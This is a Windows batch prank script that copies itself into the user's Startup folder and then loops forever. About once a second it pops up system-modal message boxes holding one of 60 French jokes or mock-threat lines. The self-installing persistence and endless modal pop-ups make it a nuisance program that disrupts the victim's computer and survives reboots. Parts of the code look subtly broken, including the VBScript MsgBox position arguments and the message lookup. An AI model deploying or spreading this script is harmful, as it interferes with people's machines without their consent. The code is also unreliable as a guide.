@echo off
title Messages Amusants

REM Ajout du script au dossier de démarrage
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%~f0" "%startup_folder%"

REM Creation du script VBScript pour afficher les messages
(
    echo Set objArgs = WScript.Arguments
    echo strMessage = objArgs(0)
    echo strTitle = objArgs(1)
    echo Set objShell = CreateObject("WScript.Shell")
    echo intScreenWidth = objShell.Screen.Width
    echo intScreenHeight = objShell.Screen.Height
    echo x = Int((intScreenWidth - 600) * Rnd + 1)
    echo y = Int((intScreenHeight - 200) * Rnd + 1)
    echo MsgBox strMessage, vbOKOnly + vbSystemModal, strTitle, x, y
) > MessageBox.vbs

REM Liste des messages
set "messages[1]=Pourquoi les pingouins ne peuvent-ils pas voler? Parce qu'ils n'ont pas de billets d'avion!"
set "messages[2]=Qu'est-ce qu'un chien qui pratique la meditation? Un chien de meditation!"
set "messages[3]=Pourquoi les poissons detestent-ils les ordinateurs? Parce qu'ils ont peur du net!"
set "messages[4]=Qu'est-ce qui est jaune et qui attend? Jonathan!"
set "messages[5]=Pourquoi les vaches ont-elles un clocher? Parce qu'elles prennent lait et se levent tot!"
set "messages[6]=Qu'est-ce qui est petit, rouge et qui monte et qui descend? Un petit pois dans un ascenseur!"
set "messages[7]=Pourquoi les vampires n'utilisent-ils pas de Facebook? Parce qu'ils ont peur de se faire piquer dans les photos!"
set "messages[8]=Qu'est-ce qui est jaune et qui rend aveugle? Un poulet en colere!"
set "messages[9]=Pourquoi les grenouilles sont-elles toujours si heureuses? Parce qu'elles mangent ce qui les fait sauter!"
set "messages[10]=Qu'est-ce qu'une poule qui a fait le tour du monde? Une cocotte minute!"
set "messages[11]=Quel est le sport prefere des souris? Le fromage-gruyere!"
set "messages[12]=Pourquoi les fantomes n'utilisent-ils jamais d'ordinateurs? Parce qu'ils ont peur du curseur!"
set "messages[13]=Qu'est-ce qu'un chien qui lit? Un chien-livre!"
set "messages[14]=Qu'est-ce qu'un eclair qui tombe sur un hopital? Un stetho-flash!"
set "messages[15]=Qu'est-ce qui est noir, blanc, noir, blanc, noir, blanc? Un pingouin qui roule dans la farine!"
set "messages[16]=Qu'est-ce qu'un mouton avec un pistolet? Un mouton-blier!"
set "messages[17]=Pourquoi les poules ne peuvent-elles pas conduire? Parce qu'elles crissent dans les virages!"
set "messages[18]=Pourquoi les poissons sont-ils si malins? Parce qu'ils passent leur temps a ecouter des bulles!"
set "messages[19]=Qu'est-ce qui est vert et qui monte et qui descend? Un petit pois dans un ascenseur en panne!"
set "messages[20]=Pourquoi les plongeurs plongent-ils toujours en arriere et jamais en avant? Parce que sinon ils tombent dans le bateau!"
set "messages[21]=Que fait un crocodile quand il voit quelque chose de delicieux? Il l'attrape!"
set "messages[22]=Qu'est-ce qui est petit, jaune, et qui ne peut pas nager? Un bulldozer!"
set "messages[23]=Qu'est-ce qui a 6 roues et vole? Une poubelle super rapide!"
set "messages[24]=Pourquoi les elephants ne jouent-ils jamais au poker? Parce qu'ils sont facilement reperables!"
set "messages[25]=Pourquoi les oiseaux n'ont-ils jamais peur des araignees? Parce qu'ils les mangent!"
set "messages[26]=Qu'est-ce qui est jaune et qui devient rouge en appuyant sur un bouton? Une banane qui s'est mise en colere!"
set "messages[27]=Pourquoi les bananes ne sont-elles jamais fatiguees? Parce qu'elles ont toujours la banane!"
set "messages[28]=Qu'est-ce qui est vert, qui a 4 pattes et qui si on le touche, il vous tue? Une pasteque!"
set "messages[29]=Pourquoi les plongeurs plongent-ils toujours en arriere et jamais en avant? Parce que sinon ils tombent dans le bateau!"
set "messages[30]=Qu'est-ce qu'un ours qui prend des photos? Un photographe animalier!"
set "messages[31]=Euh... Si tu ne me rends pas ce que tu m'as emprunte, je pourrais... euh... te demander de me le rendre!"
set "messages[32]=Hmm... Si tu ne me laisses pas tranquille, je pourrais... enfin... te demander de me laisser tranquille!"
set "messages[33]=Desole de te deranger, mais si tu continues a me taquiner, je pourrais... euh... te dire d'arreter!"
set "messages[34]=Si tu ne respectes pas mon espace, je pourrais... euh... te demander de le respecter!"
set "messages[35]=Je n'aime pas etre contrarie, mais si tu ne cesses pas de me deranger, je pourrais... enfin... te demander d'arreter!"
set "messages[36]=Si tu ne changes pas ton comportement, je pourrais... euh... te demander de le changer!"
set "messages[37]=Je ne veux pas etre impoli, mais si tu ne me rends pas mon livre, je pourrais... euh... te demander de me le rendre!"
set "messages[38]=Euh... Excuse-moi, mais si tu ne me rends pas ce que tu m'as pris, je pourrais... enfin... te demander de me le rendre!"
set "messages[39]=Si tu ne me respectes pas, je pourrais... euh... te demander de me respecter!"
set "messages[40]=Hmm... Si tu ne t'excuses pas, je pourrais... enfin... te demander de t'excuser!"
set "messages[41]=Si tu ne m'aides pas, je pourrais... euh... te demander de m'aider!"
set "messages[42]=Hmm... Si tu ne gardes pas le secret, je pourrais... enfin... te demander de ne rien dire!"
set "messages[43]=Desole de te deranger, mais si tu continues a me deranger, je pourrais... euh... te demander d'arreter!"
set "messages[44]=Si tu ne changes pas d'avis, je pourrais... euh... te demander de changer d'avis!"
set "messages[45]=Je n'aime pas etre indispose, mais si tu ne me laisses pas tranquille, je pourrais... enfin... te demander de me laisser tranquille!"
set "messages[46]=Si tu ne repares pas ce que tu as casse, je pourrais... euh... te demander de le reparer!"
set "messages[47]=Je ne veux pas etre desagreable, mais si tu ne fais pas ce que je demande, je pourrais... euh... te demander de le faire!"
set "messages[48]=Euh... Excuse-moi, mais si tu ne me rends pas service, je pourrais... enfin... te demander de m'aider!"
set "messages[49]=Si tu ne m'ecoutes pas, je pourrais... euh... te demander de m'ecouter!"
set "messages[50]=Hmm... Si tu ne respectes pas ma demande, je pourrais... enfin... te demander de la respecter!"
set "messages[51]=Si tu ne tiens pas tes promesses, je pourrais... euh... te demander de les tenir!"
set "messages[52]=Hmm... Si tu ne respectes pas mon espace personnel, je pourrais... enfin... te demander de le respecter!"
set "messages[53]=Desole de te deranger, mais si tu continues a me deranger, je pourrais... euh... te demander d'arreter!"
set "messages[54]=Si tu ne cesses pas de me mentir, je pourrais... euh... te demander d'etre honnete!"
set "messages[55]=Je n'aime pas etre contrarie, mais si tu ne me laisses pas tranquille, je pourrais... enfin... te demander de me laisser tranquille!"
set "messages[56]=Si tu ne respectes pas mes choix, je pourrais... euh... te demander de les respecter!"
set "messages[57]=Je ne veux pas etre impoli, mais si tu ne me rends pas ce qui m'appartient, je pourrais... enfin... te demander de me le rendre!"
set "messages[58]=Euh... Excuse-moi, mais si tu ne me donnes pas ce que je demande, je pourrais... euh... te demander de me le donner!"
set "messages[59]=Si tu ne te comportes pas correctement, je pourrais... euh... te demander de changer de comportement!"
set "messages[60]=Hmm... Si tu ne t'excuses pas, je pourrais... enfin... te demander de t'excuser!"

REM Fonction pour afficher les messages de maniere repetee dans une boucle infinie
:showMessages
:loop
set /a "messageIndex=%RANDOM% %% 60 + 1"
for /f "tokens=2 delims==" %%A in ('set messages[%messageIndex%]') do set "msg=%%A"
echo %msg%
cscript //nologo MessageBox.vbs "%msg%" "Messages Amusants"
timeout /t 1 >nul
goto loop

REM Lancement de la fonction pour afficher les messages
call :showMessages
